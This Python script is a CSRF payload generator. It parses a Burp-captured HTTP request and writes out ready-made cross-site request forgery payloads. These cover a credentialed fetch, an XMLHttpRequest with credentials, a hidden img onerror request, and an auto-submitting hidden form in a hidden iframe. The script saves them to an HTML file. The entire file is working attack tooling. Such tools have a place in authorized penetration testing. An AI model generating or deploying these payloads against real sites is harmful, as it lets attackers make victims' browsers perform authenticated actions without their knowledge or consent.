import sys
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def print_logo():
    logo = f"""
    {Fore.CYAN}============================
     {Fore.YELLOW}CSRF Payload Generator v1.1
       {Fore.GREEN}by Abutalib Zarban
       X: @Abutalib_zarban
    {Fore.CYAN}============================
    """
    print(logo)

def parse_burp_request(file_path):
    with open(file_path, 'r') as f:
        lines = f.readlines()

    if not lines:
        raise ValueError(f"{Fore.RED}The HTTP request file is empty.{Style.RESET_ALL}")

    request_line = lines[0].strip()
    parts = request_line.split(" ", 2)

    if len(parts) < 2:
        raise ValueError(f"{Fore.RED}Invalid request line: {request_line}{Style.RESET_ALL}")

    method, url = parts[0], parts[1]
    headers, body, parsing_headers = {}, "", True

    for line in lines[1:]:
        line = line.strip()
        if line == "":
            parsing_headers = False
            continue
        if parsing_headers:
            if ":" in line:
                key, value = line.split(":", 1)
                headers[key.strip()] = value.strip()
        else:
            body += line

    host = headers.get("Host", "")
    if not host:
        raise ValueError(f"{Fore.RED}Host header is missing.{Style.RESET_ALL}")

    protocol = "http://"
    if ":443" in host:
        protocol = "https://"
    elif ":80" in host:
        protocol = "http://"
    else:
        protocol = input(f"{Fore.YELLOW}Specify protocol (http:// or https://): {Style.RESET_ALL}").strip()
        if protocol not in ["http://", "https://"]:
            raise ValueError(f"{Fore.RED}Invalid protocol.{Style.RESET_ALL}")

    return {"method": method, "url": f"{protocol}{host}{url}", "headers": headers, "body": body}

def generate_csrf_payload(request_data, method):
    request_method, url, body = request_data["method"], request_data["url"], request_data["body"]
    if request_method == "GET":
        body = ""
    query_string = body if body else ""

    if method == "fetch":
        return f"""
<script>
fetch("{url}", {{
    method: "{request_method}",
    mode: "cors",
    credentials: "include",
    headers: {{ "Content-Type": "application/x-www-form-urlencoded" }},
    body: "{query_string}"
}});
</script>
"""
    elif method == "xhr":
        return f"""
<script>
var xhr = new XMLHttpRequest();
xhr.open("{request_method}", "{url}", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("{query_string}");
</script>
"""
    elif method == "onerror":
        return f"""
<img src="" onerror="fetch('{url}', {{
    method: '{request_method}',
    mode: 'cors',
    credentials: 'include',
    headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }}{", body: '" + query_string + "'" if request_method != "GET" else ""}
}})" style="display:none;">
"""
    elif method == "form":
        inputs = "\n".join(
            f'<input type="hidden" name="{key}" value="{value}">' 
            for key, value in [param.split("=") for param in query_string.split("&")]
        )
        return f"""
<form action="{url}" method="{request_method}" target="hidden_iframe">
    {inputs}
    <script>
        document.forms[0].submit();
    </script>
</form>
<iframe name="hidden_iframe" style="display:none;"></iframe>
"""
    else:
        return None

def generate_html(payloads, output_file="csrf_payloads.html"):
    html_content = """
<!DOCTYPE html>
<html>
<head><title>CSRF Payloads</title></head>
<body>
    <h1>Generated CSRF Payloads</h1>
"""
    for method, payload in payloads.items():
        html_content += f"<h2>{method.capitalize()} Payload</h2><pre>{payload}</pre><hr>"
    html_content += "</body></html>"
    with open(output_file, "w") as f:
        f.write(html_content)
    print(f"{Fore.GREEN}CSRF payloads saved as {output_file}{Style.RESET_ALL}")

def main():
    print_logo()
    if len(sys.argv) != 2:
        print(f"{Fore.RED}Usage: python csrf_generator.py <burp_request_file>{Style.RESET_ALL}")
        sys.exit(1)

    file_path = sys.argv[1]
    try:
        request_data = parse_burp_request(file_path)
        print(f"{Fore.YELLOW}Select payload generation method:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}1.{Style.RESET_ALL} fetch")
        print(f"{Fore.CYAN}2.{Style.RESET_ALL} xhr")
        print(f"{Fore.CYAN}3.{Style.RESET_ALL} onerror")
        print(f"{Fore.CYAN}4.{Style.RESET_ALL} form")
        print(f"{Fore.CYAN}5.{Style.RESET_ALL} All")
        choice = input(f"{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}").strip()

        methods = {"1": "fetch", "2": "xhr", "3": "onerror", "4": "form", "5": "all"}
        if choice not in methods:
            print(f"{Fore.RED}Invalid choice. Exiting.{Style.RESET_ALL}")
            sys.exit(1)

        selected_methods = [methods[choice]] if choice != "5" else ["fetch", "xhr", "onerror", "form"]
        csrf_payloads = {method: generate_csrf_payload(request_data, method) for method in selected_methods}

        generate_html(csrf_payloads)
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
